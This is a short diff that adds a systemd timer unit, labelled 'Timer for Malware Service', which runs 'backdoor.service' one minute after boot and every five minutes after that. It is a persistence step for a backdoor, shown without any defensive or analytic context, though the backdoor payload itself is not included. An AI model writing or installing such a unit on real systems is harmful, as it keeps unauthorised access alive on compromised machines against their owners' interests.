@@ -1,0 +1,10 @@
+[Unit]
+Description=Timer for Malware Service
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=5min
+Unit=backdoor.service
+
+[Install]
+WantedBy=timers.target
